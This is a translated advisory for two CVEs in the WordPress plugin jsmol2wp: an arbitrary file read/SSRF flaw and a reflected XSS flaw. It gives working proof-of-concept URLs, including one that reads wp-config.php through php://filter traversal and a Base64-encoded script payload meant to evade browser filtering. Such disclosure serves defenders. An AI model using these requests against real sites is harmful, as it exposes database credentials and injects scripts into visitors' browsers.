@@ -1,0 +1,44 @@
+ChatGPT translation of the page that doesn't render in archive.org:
+ https://web.archive.org/web/20190915000000*/https://www.cbiu.cc/2018/12/WordPress%E6%8F%92%E4%BB%B6jsmol2wp%E6%BC%8F%E6%B4%9E/
+
+Version: 1.07
+Link: https://wordpress.org/plugins/jsmol2wp/
+A simple arbitrary file read and XSS vulnerability
+
+Arbitrary file read & SSRF(CVE-2018-20463)
+/wp-content/plugins/jsmol2wp/php/jsmol.php 137th line
+
+The parameter $query of file_get_contents is directly controllable, so php://filter is used to read it. Of course, you can also use file:///etc/passwd to read the absolute path.
+
+POC:
+
+http://localhost/wp-content/plugins/jsmol2wp/php/jsmol.php
+?isform=true
+&call=getRawDataFromDatabase
+&query=php://filter/resource=../../../../wp-config.php
+
+As you can see, this is also a simple SSRF.
+
+Reflected XSS (CVE-2018-20462)
+/wp-content/plugins/jsmol2wp/php/jsmol.php 157th line
+
+Interestingly, the payload here can be encoded in BASE64, so it can bypass browser filtering.
+
+POC:
+
+http://localhost/wp-content/plugins/jsmol2wp/php/jsmol.php
+?isform=true
+&call=saveFile
+&data=<script>alert(/xss/)</script>
+&mimetype=text/html; charset=utf-8
+
+Using Base64:
+
+http://localhost/wp-content/plugins/jsmol2wp/php/jsmol.php
+?isform=true
+&call=saveFile
+&data=PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=
+&mimetype=text/html; charset=utf-8
+&encoding=base64
+
+The report describes two vulnerabilities in a WordPress plugin called "jsmol2wp". The first vulnerability is an arbitrary file read and server-side request forgery (SSRF) vulnerability (CVE-2018-20463) which can be exploited by controlling the $query parameter of file_get_contents in the jsmol.php file. The second vulnerability is a reflected cross-site scripting (XSS) vulnerability (CVE-2018-20462) which can be exploited by encoding the payload in BASE64. The report provides proof-of-concept (POC) examples for each vulnerability.
